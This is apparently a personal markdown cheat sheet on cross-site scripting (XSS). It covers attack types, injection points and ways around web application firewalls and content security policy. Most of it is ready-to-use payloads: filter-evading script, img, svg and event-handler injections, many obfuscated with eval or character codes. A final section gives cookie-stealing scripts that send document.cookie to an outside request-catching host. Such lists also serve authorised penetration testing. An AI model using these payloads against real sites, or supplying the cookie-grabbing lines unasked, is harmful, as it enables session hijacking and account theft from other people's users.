# XSS
Injection of malicious client side code into user's browser 

## Types of XXS attacks
1. Stored - payload is sent to the database and called each time the page is loaded
2. Blind XSS - type of stored XSS but you can't see the alert since it pops up in a page that you don't have access to
3. DOM Based XSS - vuln exists in client side code rather than server side code

Note: 
* Sometimes you wont see XSS alert on the same page where you entered data (Eg: profile , report).


##  Attack Surface
1. User-Agent in header
2. Image input - choosing file (XSS as an svg image)
3. XSS in URL params
4. XSS in Markdown files

## IF CSP policy is set to `self` you cannot execute inline or external scripts. Work around is JSON since it is same origin then.

Bypassing WAF:
1. Case insensitivity
2. URL encoding some special characters
3. Extra open brackets
4. Alternatives of script are - iframe, body, svg
5. Use eval

## Payloads
Basic test payload
```
<b>Test</b>
```

Basic payloads:
```
// Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"

// Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>


<img src=x onerror="a='ale';b='rt(1)';eval(a+b);">


// Svg payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

// Div payload
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```


Using html tags
```
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<iframe/src="data:text/html,<svg onload=alert(1)>">

```
A lot of options on:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

https://owasp.org/www-community/xss-filter-evasion-cheatsheet

## Getting the cookie (Data Grabber)
```
<script>location="https://requestbin/?q="+document.cookie</script>

<script>fetch("https://requestbin/?q=" + document.cookie) </script>

<script>document.location="https://requestbin/?q="+document.cookie</script>

<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>



```